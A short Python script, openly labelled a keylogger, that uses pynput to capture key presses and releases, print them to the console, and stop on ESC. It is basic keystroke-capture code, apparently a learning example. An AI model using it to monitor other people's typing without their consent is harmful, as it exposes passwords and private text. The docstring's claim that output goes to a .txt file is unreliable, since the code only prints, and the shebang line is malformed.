#!/usr/bin/env/python3

""" 
Keylogger that monitors two events: when a key is pressed and when a key is released.
Output is then saved in a .txt file
"""

# Using pynput.keyboard class for logging keystrokes 
import pynput.keyboard as Keyboard 

 
def key_press(key):
    """ Callback function whenever a key is pressed""" 
    
    try:
        print(f'Key {key.char} pressed!')

    except AttributeError:
        # key.char is not a valid ASCII value and so the key must by printed instead when a special key is pressed 
        print(f'Special Key {key} pressed!') 
 
def key_release(key):
    """ Callback function whenever a key is released""" 

    print(f'Key {key} released')

    # Stops the listener is ESC is pressed
    if key == Keyboard.Key.esc:
        return False


# Functions key_press() & key_release() are argumers to the keyboard listener  
with Keyboard.Listener(on_press=key_press, on_release=key_release) as listener:
    # Waiting for listener thread to complete execution using method: Threading.join()
    listener.join() 

